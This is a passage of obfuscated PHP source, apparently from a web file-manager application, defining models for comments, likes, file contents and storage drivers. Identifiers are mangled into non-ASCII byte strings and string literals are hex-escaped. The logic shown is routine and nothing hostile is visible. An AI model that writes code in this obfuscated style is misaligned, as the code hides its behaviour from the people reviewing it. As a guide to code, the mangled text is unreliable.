($úçÖÉ²İ as &$ÂÜ×—´ş) { if ($ŒëÉ‚„ğ) { $ÂÜ×—´ş = !1; continue; } if ($ÂÜ×—´ş) { $Ë½Û˜è = intval(_get($ÂÜ×—´ş, $½òÓ²Š½[1685], 0)); if (time() - $Ë½Û˜è > 7200) { Task::kill($ÂÜ×—´ş[$½òÓ²Š½[399]]); $ŒëÉ‚„ğ = !0; $ÂÜ×—´ş = !1; } } } return $úçÖÉ²İ; } public function restore() { $şèô »® =& $_SERVER[şÒÁøÒÄ]; ActionCall($şèô »®[1073], !0, 1); ActionCall($şèô »®[1073], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\145\156\x74"; protected $tableMeta = array("\x74\141\142\154\145\116\x61\x6d\x65" => "\x63\x6f\x6d\x6d\145\156\x74\137\x6d\145\164\141", "\x6d\145\164\x61\106\x69\x65\x6c\144" => "\x63\157\155\155\145\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($•ó°÷Şğ) { $Ø×‡¦ò¬ =& $_SERVER[şÒÁøÒÄ]; if ($•ó°÷Şğ[$Ø×‡¦ò¬[1898]]) { $êÙàÄ£ˆ = $this->where(array($Ø×‡¦ò¬[1899] => $•ó°÷Şğ[$Ø×‡¦ò¬[1898]]))->find(); if (!$êÙàÄ£ˆ || $êÙàÄ£ˆ[$Ø×‡¦ò¬[411]] != $•ó°÷Şğ[$Ø×‡¦ò¬[411]] || $êÙàÄ£ˆ[$Ø×‡¦ò¬[496]] != $•ó°÷Şğ[$Ø×‡¦ò¬[496]]) { return !1; } $this->where(array($Ø×‡¦ò¬[1899] => $•ó°÷Şğ[$Ø×‡¦ò¬[1898]]))->setAdd($Ø×‡¦ò¬[1900], 1); } $•ó°÷Şğ[$Ø×‡¦ò¬[1901]] = 0; $•ó°÷Şğ[$Ø×‡¦ò¬[1900]] = 0; $•ó°÷Şğ[$Ø×‡¦ò¬[757]] = 1; return $this->add($•ó°÷Şğ); } public function commentCount($ª½œÙ¶·, $İ‹ÜÏç, $ÜÏ´óåÖ = false) { $İØŠñŒÜ =& $_SERVER[şÒÁøÒÄ]; if (!$ª½œÙ¶·) { return array(); } if (is_string($ª½œÙ¶·) || is_int($ª½œÙ¶·)) { $ª½œÙ¶· = array($ª½œÙ¶·); } $ûõˆ©Á = array($İØŠñŒÜ[496], $İØŠñŒÜ[1902] => $İØŠñŒÜ[491]); $•£ÇÆëì = array($İØŠñŒÜ[496] => array($İØŠñŒÜ[7], $ª½œÙ¶·), $İØŠñŒÜ[411] => $İ‹ÜÏç); if ($ÜÏ´óåÖ) { $•£ÇÆëì[$İØŠñŒÜ[1680]] = $ÜÏ´óåÖ; } $àÏ’ü² = $this->field($ûõˆ©Á)->where($•£ÇÆëì)->group($İØŠñŒÜ[496])->select(); return array_to_keyvalue($àÏ’ü², $İØŠñŒÜ[496], $İØŠñŒÜ[491]); } public function starTarget($İßÌ¥¤, $ò‰å„–Õ) { $¹É„Ú =& $_SERVER[şÒÁøÒÄ]; $îÑë˜È = $İßÌ¥¤ + self::TYPE_STAR_OFFSET; $šµÌŞÒô = array($¹É„Ú[1680] => USER_ID, $¹É„Ú[411] => $îÑë˜È, $¹É„Ú[496] => $ò‰å„–Õ); $ÏşºêÅã = $this->where($šµÌŞÒô)->find(); if ($ÏşºêÅã) { return $this->where(array($¹É„Ú[399] => $ÏşºêÅã[$¹É„Ú[399]]))->delete(); } $„¹ã† = array($¹É„Ú[1898] => 0, $¹É„Ú[1680] => USER_ID, $¹É„Ú[757] => 1, $¹É„Ú[762] => $¹É„Ú[12], $¹É„Ú[411] => $îÑë˜È, $¹É„Ú[496] => $ò‰å„–Õ, $¹É„Ú[1901] => 0, $¹É„Ú[1900] => 0); return $this->add($„¹ã†); } public function starTargetCount($µë†¸˜ö, $ÁÌ ¨í‹) { $‡ÍŒºê£ =& $_SERVER[şÒÁøÒÄ]; $‡­¤ Äë = $ÁÌ ¨í‹ + self::TYPE_STAR_OFFSET; $ı¿¡¼®ß = $this->commentCount($µë†¸˜ö, $‡­¤ Äë); $ƒ†í‡Ñ = $this->commentCount($µë†¸˜ö, $‡­¤ Äë, USER_ID); return array($‡ÍŒºê£[1903] => $ı¿¡¼®ß, $‡ÍŒºê£[1904] => $ƒ†í‡Ñ); } public function starTargetUserList($ãˆÄÂäÂ, $àŒ¶Ğò¿) { $½Ô™™‘ä =& $_SERVER[şÒÁøÒÄ]; $íû·íşë = $ãˆÄÂäÂ + self::TYPE_STAR_OFFSET; $âı¸Öø¾ = array($½Ô™™‘ä[496] => $àŒ¶Ğò¿, $½Ô™™‘ä[411] => $íû·íşë); $Å’ÌœÁÌ = $this->where($âı¸Öø¾)->count(); $ÃçÄñ–¯ = array($½Ô™™‘ä[255] => $Å’ÌœÁÌ, $½Ô™™‘ä[1905] => array()); if (!$Å’ÌœÁÌ) { return $ÃçÄñ–¯; } $¨‘ºÑÆ± = $this->field($½Ô™™‘ä[1680])->where($âı¸Öø¾)->limit(500)->select(); $¨‘ºÑÆ± = array_to_keyvalue($¨‘ºÑÆ±, $½Ô™™‘ä[12], $½Ô™™‘ä[1680]); $ÃçÄñ–¯[$½Ô™™‘ä[1905]] = Model($½Ô™™‘ä[504])->userListInfo($¨‘ºÑÆ±); return $ÃçÄñ–¯; } public function prasiseUserList($—ĞâÅ«ğ) { $£òƒ“Áş =& $_SERVER[şÒÁøÒÄ]; $úâ‰ŸÌÑ = array($£òƒ“Áş[1906] => $—ĞâÅ«ğ); $‰ÃÀ³Ã = $this->where($úâ‰ŸÌÑ)->find(); $ï½ƒ¼‚î = _get($‰ÃÀ³Ã, $£òƒ“Áş[1901], 0); $ƒ…“Æ¢ = array($£òƒ“Áş[255] => $ï½ƒ¼‚î, $£òƒ“Áş[1905] => array()); if (!$ï½ƒ¼‚î) { return $ƒ…“Æ¢; } $¶á¸š½´ = Model($£òƒ“Áş[1907])->field($£òƒ“Áş[1680])->where($úâ‰ŸÌÑ)->limit(500)->select(); $¶á¸š½´ = array_to_keyvalue($¶á¸š½´, $£òƒ“Áş[12], $£òƒ“Áş[1680]); $ƒ…“Æ¢[$£òƒ“Áş[1905]] = Model($£òƒ“Áş[504])->userListInfo($¶á¸š½´); return $ƒ…“Æ¢; } public function remove($´¤ğæèØ) { $ÀîĞ·ê =& $_SERVER[şÒÁøÒÄ]; $ƒºé×Âê = array($ÀîĞ·ê[1899] => $´¤ğæèØ); $êí“Ç¯ø = $this->where($ƒºé×Âê)->find(); if ($êí“Ç¯ø[$ÀîĞ·ê[1898]]) { $this->where(array($ÀîĞ·ê[1899] => $êí“Ç¯ø[$ÀîĞ·ê[1898]]))->setAdd($ÀîĞ·ê[1900], -1); } return $this->where($ƒºé×Âê)->delete(); } public function edit($ÆåêšúÃ, $±Ùõ´¨) { $ã…Ã¾ =& $_SERVER[şÒÁøÒÄ]; $ºöıÔÎ = array($ã…Ã¾[1899] => $ÆåêšúÃ); return $this->where($ºöıÔÎ)->save(array($ã…Ã¾[1908] => $±Ùõ´¨)); } public function prasise($Üô‡€ñï) { $”«ü¦ =& $_SERVER[şÒÁøÒÄ]; $ê–Ğş’ò = Model($”«ü¦[1909]); $·í·Ş·û = array($”«ü¦[1899] => $Üô‡€ñï, $”«ü¦[1671] => USER_ID); $»½æÂ”ˆ = $ê–Ğş’ò->where($·í·Ş·û)->find(); if (!$»½æÂ”ˆ) { $ê–Ğş’ò->add($·í·Ş·û); $¥ö™íÔø = $this->where(array($”«ü¦[1899] => $Üô‡€ñï))->setAdd($”«ü¦[1901], 1); } else { $ê–Ğş’ò->where($·í·Ş·û)->delete(); $¥ö™íÔø = $this->where(array($”«ü¦[1899] => $Üô‡€ñï))->setAdd($”«ü¦[1901], -1); } return $¥ö™íÔø; } public function targetInfo($Ûé§Ìé½, $¢Æ–öÄô) { $”Š³±çì =& $_SERVER[şÒÁøÒÄ]; $ñûÙ¼Ë = array($”Š³±çì[576] => $Ûé§Ìé½, $”Š³±çì[577] => $¢Æ–öÄô); $­½—ìá² = $this->where($ñûÙ¼Ë)->count(); $†÷àÚò… = "\122\x49\107\110\x54\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\x63\x6f\155\x6d\145\x6e\x74\x5f\x70\162\141\x69\x73\145\40\x73\x74\x61\x72\x20\x6f\156\x20\x63\x6f\x6d\x6d\x65\x6e\x74\56\x63\x6f\x6d\155\x65\156\x74\111\x44\40\75\x20\x73\x74\x61\x72\56\143\x6f\155\155\145\156\x74\x49\x44"; $É¦ªùÊê = $this->alias($”Š³±çì[354])->where($ñûÙ¼Ë)->join($†÷àÚò…, $”Š³±çì[1910])->count(); $ı¾È›ıß = array($”Š³±çì[1911] => $­½—ìá², $”Š³±çì[1912] => $É¦ªùÊê); return $ı¾È›ıß; } public function listData($Éçã—Šı) { $Å‰ŒÃóå =& $_SERVER[şÒÁøÒÄ]; if (isset($Éçã—Šı[$Å‰ŒÃóå[1913]])) { if ($Éçã—Šı[$Å‰ŒÃóå[1913]]) { $Éçã—Šı[$Å‰ŒÃóå[1906]] = array($Å‰ŒÃóå[1027], intval($Éçã—Šı[$Å‰ŒÃóå[1913]])); } unset($Éçã—Šı[$Å‰ŒÃóå[1913]]); } if (isset($Éçã—Šı[$Å‰ŒÃóå[1914]])) { if ($Éçã—Šı[$Å‰ŒÃóå[1914]]) { $Éçã—Šı[$Å‰ŒÃóå[1906]] = array($Å‰ŒÃóå[1024], intval($Éçã—Šı[$Å‰ŒÃóå[1914]])); } unset($Éçã—Šı[$Å‰ŒÃóå[1914]]); } return $this->_listData($Éçã—Šı); } private function _listData($îëÄÜØŸ) { $©ßÆ†ğü =& $_SERVER[şÒÁøÒÄ]; $‰´“Üô¶ = $this->where($îëÄÜØŸ)->_makeOrder()->selectPage(100); $this->_listAppendParent($‰´“Üô¶[$©ßÆ†ğü[369]]); $this->_listAppendUser($‰´“Üô¶[$©ßÆ†ğü[369]]); $this->_listAppendMeta($‰´“Üô¶[$©ßÆ†ğü[369]]); return $‰´“Üô¶; } private function _makeOrder() { $Á—œ­ =& $_SERVER[şÒÁøÒÄ]; $¼Ùö”«ù = array($Á—œ­[1901], $Á—œ­[1900], $Á—œ­[201]); $ŞÅ¹ƒ® = Input::get($Á—œ­[457], $Á—œ­[7], $Á—œ­[423], $¼Ùö”«ù); $ÒÁºÊÄ• = Input::get($Á—œ­[458], $Á—œ­[7], $Á—œ­[1673], array($Á—œ­[1915], $Á—œ­[453])); $’¿ã´ï— = $ŞÅ¹ƒ® . $Á—œ­[53] . $ÒÁºÊÄ•; return $this->order($’¿ã´ï—); } private function _listAppendParent(&$şğ½›”š) { $Éü…‹ş =& $_SERVER[şÒÁøÒÄ]; $Èõ×Â‡ = array_unique(array_to_keyvalue($şğ½›”š, $Éü…‹ş[12], $Éü…‹ş[1898])); $Èõ×Â‡ = array_remove_value($Èõ×Â‡, $Éü…‹ş[198]); if (!$Èõ×Â‡) { return; } $µåãù£Ì = $this->where(array($Éü…‹ş[1899] => array($Éü…‹ş[7], $Èõ×Â‡)))->select(); $µåãù£Ì = array_to_keyvalue($µåãù£Ì, $Éü…‹ş[1906]); foreach ($şğ½›”š as &$–«ô†Ã) { if (isset($µåãù£Ì[$–«ô†Ã[$Éü…‹ş[1898]]])) { $–«ô†Ã[$Éü…‹ş[1916]] = $µåãù£Ì[$–«ô†Ã[$Éü…‹ş[1898]]]; } } unset($–«ô†Ã); } private function _listAppendUser(&$ø¨€ï¨Ì) { $ÕÏì¼çŸ =& $_SERVER[şÒÁøÒÄ]; $ÛÏ™…ƒ = array_unique(array_to_keyvalue($ø¨€ï¨Ì, $ÕÏì¼çŸ[12], $ÕÏì¼çŸ[1680])); $ÛÏ™…ƒ = array_remove_value($ÛÏ™…ƒ, $ÕÏì¼çŸ[198]); if (count($ÛÏ™…ƒ) == 0) { return; } foreach ($ø¨€ï¨Ì as $ğ»ËÖÉ”) { if (isset($ğ»ËÖÉ”[$ÕÏì¼çŸ[1916]])) { $ÛÏ™…ƒ[] = $ğ»ËÖÉ”[$ÕÏì¼çŸ[1916]][$ÕÏì¼çŸ[1680]]; } } $¹øò¡ÈÃ = Model($ÕÏì¼çŸ[525])->userListInfo($ÛÏ™…ƒ); foreach ($ø¨€ï¨Ì as &$ğ»ËÖÉ”) { $ğ»ËÖÉ”[$ÕÏì¼çŸ[590]] = $¹øò¡ÈÃ[$ğ»ËÖÉ”[$ÕÏì¼çŸ[1680]]]; if (isset($ğ»ËÖÉ”[$ÕÏì¼çŸ[1916]])) { $ğ»ËÖÉ”[$ÕÏì¼çŸ[1916]][$ÕÏì¼çŸ[590]] = $¹øò¡ÈÃ[$ğ»ËÖÉ”[$ÕÏì¼çŸ[1916]][$ÕÏì¼çŸ[1680]]]; } } unset($ğ»ËÖÉ”); } private function _listAppendMeta(&$Æ–İÊ„•) { $ıÙüÁú³ =& $_SERVER[şÒÁøÒÄ]; $ÑÔà·À¡ = array_unique(array_to_keyvalue($Æ–İÊ„•, $ıÙüÁú³[12], $ıÙüÁú³[1906])); $ÑÔà·À¡ = array_remove_value($ÑÔà·À¡, $ıÙüÁú³[198]); if (!$ÑÔà·À¡) { return; } foreach ($Æ–İÊ„• as $·îÂæä­) { if (isset($·îÂæä­[$ıÙüÁú³[1916]])) { $ÑÔà·À¡[] = $·îÂæä­[$ıÙüÁú³[1916]][$ıÙüÁú³[1906]]; } } $ÁÅÎ§õ³ = $this->metaList($ÑÔà·À¡); if (!$ÁÅÎ§õ³) { return !1; } foreach ($Æ–İÊ„• as &$·îÂæä­) { $·îÂæä­[$ıÙüÁú³[466]] = $ÁÅÎ§õ³[$·îÂæä­[$ıÙüÁú³[1906]]]; if (isset($·îÂæä­[$ıÙüÁú³[1916]])) { $·îÂæä­[$ıÙüÁú³[1916]][$ıÙüÁú³[466]] = $ÁÅÎ§õ³[$·îÂæä­[$ıÙüÁú³[1916]][$ıÙüÁú³[1906]]]; } } unset($·îÂæä­); } private function metaList($ùñŞµ«®) { $˜Œ¨ÊìÍ =& $_SERVER[şÒÁøÒÄ]; if (!$ùñŞµ«®) { return array(); } $ê€ó¦£ = array($˜Œ¨ÊìÍ[1906] => array($˜Œ¨ÊìÍ[7], $ùñŞµ«®)); $‹¢Ñ†±· = Model($˜Œ¨ÊìÍ[1917])->where($ê€ó¦£)->select(); $‹¢Ñ†±· = array_to_keyvalue_group($‹¢Ñ†±·, $˜Œ¨ÊìÍ[1906]); foreach ($‹¢Ñ†±· as $ŸŸü¡ü† => $¼¾Ï¼ü) { $°™øÂ“ = array(); foreach ($¼¾Ï¼ü as $ê¡ÁğÚ) { $°™øÂ“[$ê¡ÁğÚ[$˜Œ¨ÊìÍ[94]]] = $ê¡ÁğÚ[$˜Œ¨ÊìÍ[374]]; } $‹¢Ñ†±·[$ŸŸü¡ü†] = $°™øÂ“; } return $‹¢Ñ†±· ? $‹¢Ñ†±· : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\x6c\x65\x5f\x63\x6f\156\164\x65\x6e\164\x73"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\124\151\x6d\145", "\x74\x69\155\x65", "\x69\x6e\x73\145\162\164", "\x66\x75\x6e\143\164\x69\157\156")); } goto f°¼Œ‚‚¹; F›™ ‹ ÂÎ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\x73\x6f\165\x72\143\x65\x53\x65\143\x72\x65\164\x4c\151\x73\x74"; public $field = array("\163\x6f\x75\162\143\x65\111\x44", "\164\x79\160\x65\111\x44", "\x63\x72\x65\x61\x74\x65\125\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\56\163\x74\x6f\162\141\x67\145\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\x73\x69\x7a\x65\115\141\x78", "\163\171\163\x74\145\155", "\144\x65\x66\141\x75\154\164", "\x64\162\151\x76\145\x72", "\143\157\156\146\151\x67"); public function listData($•§œ´Å´ = false, $Ó‚Ú«âÔ = "\155\x6f\x64\151\146\x79\124\151\x6d\x65", $É”ˆä—½ = false) { $ªïöÜÂ =& $_SERVER[şÒÁøÒÄ]; $û¸«•´ = parent::listData($•§œ´Å´, $Ó‚Ú«âÔ, $É”ˆä—½); if ($•§œ´Å´) { return $û¸«•´; } $ŠÂÁ¨Ëß = $this->ioSizeUseGet(array_to_keyvalue($û¸«•´, $ªïöÜÂ[12], $ªïöÜÂ[399])); foreach ($û¸«•´ as $½¬¦ÀÚ‹ => $¯ÍöÌÙÃ) { unset($û¸«•´[$½¬¦ÀÚ‹][$ªïöÜÂ[6]]); $û¸«•´[$½¬¦ÀÚ‹][$ªïöÜÂ[1858]] = isset($ŠÂÁ¨Ëß[$¯ÍöÌÙÃ[$ªïöÜÂ[399]]]) ? $ŠÂÁ¨Ëß[$¯ÍöÌÙÃ[$ªïöÜÂ[399]]] : 0; } return $û¸«•´; } public function ioSizeUseGet($ÁŠÔÌ›Ï) { $î£İìûâ =& $_SERVER[şÒÁøÒÄ]; if (!$ÁŠÔÌ›Ï) { return array(); } $ÈÔ¸˜õİ = $î£İìûâ[2185] . implode($î£İìûâ[50], $ÁŠÔÌ›Ï); $ãšÍ¿Ôé = Cache::get($ÈÔ¸˜õİ); if ($ãšÍ¿Ôé) { return $ãšÍ¿Ôé; } $øƒÔ•·Ò = array($î£İìûâ[825] => $î£İìûâ[399], $î£İìûâ[2186] => $î£İìûâ[76]); $¼ú‘Áè = array($î£İìûâ[825] => array($î£İìûâ[7], $ÁŠÔÌ›Ï)); $ãšÍ¿Ôé = Model($î£İìûâ[797])->field($øƒÔ•·Ò)->where($¼ú‘Áè)->group($î£İìûâ[825])->select(); $ãšÍ¿Ôé = array_to_keyvalue($ãšÍ¿Ôé, $î£İìûâ[399], $î£İìûâ[76]); Cache::set($ÈÔ¸˜õİ, $ãšÍ¿Ôé, 600); return $ãšÍ¿Ôé; } public function getConfig($Ÿé¥ùô„) { $à„Øñ’¢ = parent::listData($Ÿé¥ùô„); return json_decode($à„Øñ’¢[$_SERVER[şÒÁøÒÄ][6]], !0); } public function update($åÉıİó°, $¹´·Ó»Í) { $ººèåªÖ =& $_SERVER[şÒÁøÒÄ]; $ÎçØŒë– = $¹´·Ó»Í[$ººèåªÖ[32]]; $ø“Ù™Ğƒ = array_to_keyvalue(parent::listData(), $ººèåªÖ[32]); if (isset($ø“Ù™Ğƒ[$ÎçØŒë–]) && $ø“Ù™Ğƒ[$ÎçØŒë–][$ººèåªÖ[399]] != $åÉıİó°) { return !1; } $this->checkPwd($åÉıİó°, $¹´·Ó»Í); if (isset($¹´·Ó»Í[$ººèåªÖ[2187]]) && $¹´·Ó»Í[$ººèåªÖ[2187]] == $ººèåªÖ[88]) { $this->checkConfig($¹´·Ó»Í); } unset($¹´·Ó»Í[$ººèåªÖ[2187]]); $ôî·«œå = parent::update($åÉıİó°, $¹´·Ó»Í); if ($ôî·«œå && $¹´·Ó»Í[$ººèåªÖ[37]]) { $ŞÕÉÊöû = 0; foreach ($ø“Ù™Ğƒ as $™èğÊ‡±) { if ($™èğÊ‡±[$ººèåªÖ[37]] && $™èğÊ‡±[$ººèåªÖ[399]] != $åÉıİó°) { $ŞÕÉÊöû = $™èğÊ‡±[$ººèåªÖ[399]]; parent::update($™èğÊ‡±[$ººèåªÖ[399]], array($ººèåªÖ[37] => 0)); } } $this->updateBackup($åÉıİó°, $ŞÕÉÊöû); } return $ôî·«œå; } public function add($¦Ÿò¥î) { $åÌœğç± =& $_SERVER[şÒÁøÒÄ]; $ÇŒ“³„· = array_to_keyvalue(parent::listData(), $åÌœğç±[32]); if (isset($ÇŒ“³„·[$¦Ÿò¥î[$åÌœğç±[32]]])) { return !1; } $this->checkConfig($¦Ÿò¥î); $•Îà˜´Æ = parent::insert($¦Ÿò¥î); if ($•Îà˜´Æ && $¦Ÿò¥î[$åÌœğç±[37]]) { foreach ($ÇŒ“³„· as $Òù°¤Öâ) { if ($Òù°¤Öâ[$åÌœğç±[37]]) { parent::update($Òù°¤Öâ[$åÌœğç±[399]], array($åÌœğç±[37] => 0)); } } } return $•Îà˜´Æ; } public function updateBackup($˜Ğô“²³, $ûø•ûŒØ) { $ùÉ¹ÛÌ =& $_SERVER[şÒÁøÒÄ]; if (!$ûø•ûŒØ) { return; } $¥§ü·á€ = Model($ùÉ¹ÛÌ[756])->config(); if ($¥§ü·á€[$ùÉ¹ÛÌ[1650]] != $ùÉ¹ÛÌ[88] || $¥§ü·á€[$ùÉ¹ÛÌ[759]] != $ûø•ûŒØ) { return; } $èªä×‹¶ = Model($ùÉ¹ÛÌ[778])->get($ùÉ¹ÛÌ[788]); $èªä×‹¶ = json_decode($èªä×‹¶, !0); if (!$èªä×‹¶) { return; } $èªä×‹¶[$ùÉ¹ÛÌ[759]] = $˜Ğô“²³; Model($ùÉ¹ÛÌ[778])->set(array($ùÉ¹ÛÌ[788] => $èªä×‹¶)); } public function checkPwd($ïç†Üè, &$òè’¨Õ) { $‡¢©®šÕ =& $_SERVER[şÒÁøÒÄ]; if (empty($òè’¨Õ[$‡¢©®šÕ[6]])) { return; } $ÕŒ„îÍ = json_decode($òè’¨Õ[$‡¢©®šÕ[6]], !0); $àÃÂ²™£ = $‡¢©®šÕ[12]; $ĞĞ‡Ï•ş = array($‡¢©®šÕ[2188], $‡¢©®šÕ[2189], $‡¢©®šÕ[902]); foreach ($ĞĞ‡Ï•ş as $ñğóƒõ³) { if (isset($ÕŒ„îÍ[$ñğóƒõ³])) { $àÃÂ²™£ = $ñğóƒõ³; break; } } if (!$àÃÂ²™£) { return; } $Áë¨³ˆÑ = $this->getConfig($ïç†Üè); $—ä‡ã˜ = $Áë¨³ˆÑ[$àÃÂ²™£]; $×Áöİ’¬ = $ÕŒ„îÍ[$àÃÂ²™£]; if ($×Áöİ’¬ == str_repeat($‡¢©®šÕ[189], strlen($—ä‡ã˜))) { $ÕŒ„îÍ[$àÃÂ²™£] = $—ä‡ã˜; $òè’¨Õ[$‡¢©®šÕ[6]] = json_encode($ÕŒ„îÍ); } else { if ($×Áöİ’¬ != $—ä‡ã˜) { $òè’¨Õ[$‡¢©®šÕ[2187]] = $‡¢©®šÕ[88]; } } } public function checkConfig(&$áÎÈÀÏÕ, $´Ğ–´¬ = false) { $†™×øéú =& $_SERVER[şÒÁøÒÄ]; $ä—Ùìõ‡ = strtolower($áÎÈÀÏÕ[$†™×øéú[95]]); $ªØÔøØ  = json_decode($áÎÈÀÏÕ[$†™×øéú[6]], !0); foreach ($ªØÔøØ  as $äƒõ¦ıÃ => $Ã“£¤) { $ªØÔøØ [$äƒõ¦ıÃ] = trim($Ã“£¤); } $ªØÔøØ [$†™×øéú[2190]] = rand_string(6); $¢Ï•èÜĞ = $GLOBALS[$†™×øéú[6]][$†™×øéú[89]][$†™×øéú[834]]; $’ÈÛ–ô÷ = isset($¢Ï•èÜĞ[$ä—Ùìõ‡]) ? $¢Ï•èÜĞ[$ä—Ùìõ‡] : ucfirst($ä—Ùìõ‡); $¿€ôù¨Î = $†™×øéú[74] . $’ÈÛ–ô÷; if (!$’ÈÛ–ô÷ || !class_exists($¿€ôù¨Î)) { if ($´Ğ–´¬) { return LNG($†™×øéú[2191]); } write_log(array($†™×øéú[2192], $áÎÈÀÏÕ, get_caller_info()), $†™×øéú[2193]); show_json(LNG($†™×øéú[2191]), !1, $áÎÈÀÏÕ); } $†ñ¹“ = new $¿€ôù¨Î($ªØÔøØ ); if (in_array($ä—Ùìõ‡, $†ñ¹“->objectDriver)) { if (!$†ñ¹“->isBucketCors() && !$†ñ¹“->setBucketCors()) { $¥óå¿­¦ = LNG($†™×øéú[2194]); $¥óå¿­¦ .= $†™×øéú[2195] . LNG($†™×øéú[2196]); if ($´Ğ–´¬) { return $¥óå¿­¦; } show_json($¥óå¿­¦, !1); } } $°”ÕÇùì = rtrim($ªØÔøØ [$†™×øéú[1193]], $†™×øéú[8]) . $†™×øéú[8]; $›’‹µ¤ = $†ñ¹“->getPath($°”ÕÇùì . $†™×øéú[1197]); if (!$†ñ¹“->mkfile($›’‹µ¤)) { if ($´Ğ–´¬) { return LNG($†™×øéú[2194]); } show_json(LNG($†™×øéú[2194]), !1); } $ªØÔøØ [$†™×øéú[1193]] = $°”ÕÇùì; $áÎÈÀÏÕ[$†™×øéú[6]] = json_encode($ªØÔøØ ); $áÎÈÀÏÕ[$†™×øéú[95]] = $’ÈÛ–ô÷; return !0; } public function driverListSystem() { $şĞ¥óØÒ =& $_SERVER[şÒÁøÒÄ]; $ïƒÈ²‚• = parent::listData(); $ˆ…ê®ÕÏ = array(); foreach ($ïƒÈ²‚• as $¡Õöëíå) { unset($¡Õöëíå[$şĞ¥óØÒ[201]], $¡Õöëíå[$şĞ¥óØÒ[85]]); $¡Õöëíå[$şĞ¥óØÒ[6]] = json_decode($¡Õöëíå[$şĞ¥óØÒ[6]], !0); $ˆ…ê®ÕÏ[] = $¡Õöëíå; } return $ˆ…ê®ÕÏ; } public function defaultDriver() { $âÓ¼È¹ó =& $_SERVER[şÒÁøÒÄ]; $’ùı‰“„ = parent::listData(); $ë¼¥±Å« = array_filter_by_field($’ùı‰“„, $âÓ¼È¹ó[37], 1); $ë¼¥±Å« = $ë¼¥±Å«[0]; if ($ë¼¥±Å«) { $ë¼¥±Å«[$âÓ¼È¹ó[6]] = json_decode($ë¼¥±Å«[$âÓ¼È¹ó[6]], !0); } return $ë¼¥±Å«; } public function driverInfo($üÉ¾¯„˜) { $¡Âã¢É” =& $_SERVER[şÒÁøÒÄ]; $¥¾Û’— = array_to_keyvalue(parent::listData(), $¡Âã¢É”[399]); if (!isset($¥¾Û’—[$üÉ¾¯„˜])) { return !1; } $»›¼¤Ù± = $¥¾Û’—[$üÉ¾¯„˜]; $»›¼¤Ù±[$¡Âã¢É”[6]] = json_decode($»›¼¤Ù±[$¡Âã¢É”[6]], !0); return $»›¼¤Ù±; } public function remove($ÅĞ²‹§¤) { $this->removeShareItems($ÅĞ²‹§¤); return parent::remove($ÅĞ²‹§¤); } public function removeWithFile($¤ú¹Æ»œ, $¥¤ôµ²Ô) { $ô¿Ú¦‚º =& $_SERVER[şÒÁøÒÄ]; $©÷ËıÈ = array($ô¿Ú¦‚º[825] => $¤ú¹Æ»œ); $Á¥ØìÀØ = Model($ô¿Ú¦‚º[471])->where($©÷ËıÈ)->count(); $¤Ø‡ïß = Model($ô¿Ú¦‚º[471])->where($©÷ËıÈ)->sum($ô¿Ú¦‚º[76]); $¸›œÔ–Ú = $¥¤ôµ²Ô . $ô¿Ú¦‚º[2197] . $¤ú¹Æ»œ; $»Šï‘úÉ = LNG($¥¤ôµ²Ô == $ô¿Ú¦‚º[548] ? $ô¿Ú¦‚º[2198] : $ô¿Ú¦‚º[2199]); $­³şîæ = new TaskFileTransfer($¸›œÔ–Ú, $ô¿Ú¦‚º[2193], $Á¥ØìÀØ, $»Šï‘úÉ . "\50{$¤ú¹Æ»œ}\x29"); $­³şîæ->task[$ô¿Ú¦‚º[771]] = (double) $¤Ø‡ïß; $†õ˜Û€å = KodIO::defaultDriver(); $Àï¸³Ï· = $†õ˜Û€å[$ô¿Ú¦‚º[399]]; $—Æà ùê = "\173\x69\157\x3a{$Àï¸³Ï·}\x7d\x2f"; $ÂÁƒÊÓ = !0; $ã©òÊ„ = array(); $äÓÁ´êö = Model($ô¿Ú¦‚º[200])->where($©÷ËıÈ)->field($ô¿Ú¦‚º[2200])->select(); foreach ($äÓÁ´êö as $üúâÉÚÈ) { $Ö£¸Îàê = $üúâÉÚÈ[$ô¿Ú¦‚º[84]]; $ãšË¦áÍ = $—Æà ùê . str_replace("\173\x69\x6f\x3a{$¤ú¹Æ»œ}\x7d\57", $ô¿Ú¦‚º[12], $Ö£¸Îàê); if (!IO::exist($Ö£¸Îàê)) { $ã©òÊ„[] = $üúâÉÚÈ[$ô¿Ú¦‚º[468]]; $­³şîæ->updateFileEnd($üúâÉÚÈ[$ô¿Ú¦‚º[32]], $üúâÉÚÈ[$ô¿Ú¦‚º[76]]); continue; } if (IO::exist($ãšË¦áÍ)) { $­³şîæ->updateFileEnd($üúâÉÚÈ[$ô¿Ú¦‚º[32]], $üúâÉÚÈ[$ô¿Ú¦‚º[76]]); continue; } if (!IO::move($Ö£¸Îàê, get_path_father($ãšË¦áÍ))) { $ÂÁƒÊÓ = !1; break; } $©÷ËıÈ = array($ô¿Ú¦‚º[468] => $üúâÉÚÈ[$ô¿Ú¦‚º[468]]); $ÁÔ¿¿¢‘ = array($ô¿Ú¦‚º[825] => $Àï¸³Ï·, $ô¿Ú¦‚º[84] => $ãšË¦áÍ); Model($ô¿Ú¦‚º[200])->where($©÷ËıÈ)->save($ÁÔ¿¿¢‘); } $this->removeByFileID($ã©òÊ„); if (!$ÂÁƒÊÓ) { $­³şîæ->stop($¸›œÔ–Ú); return !1; } $­³şîæ->end(); if ($¥¤ôµ²Ô == $ô¿Ú¦‚º[1838]) { $this->remove($¤ú¹Æ»œ); } } public function progress($Æêïêıé, $ÛŠƒº»·) { return Task::get($ÛŠƒº»· . $_SERVER[şÒÁøÒÄ][2197] . $Æêïêıé); } private function removeByFileID($‡¶Æ­… = array()) { $ªèË‹Ğ =& $_SERVER[şÒÁøÒÄ]; if (empty($‡¶Æ­…)) { return; } $â²õñ¨ = array($ªèË‹Ğ[468] => array($ªèË‹Ğ[7], 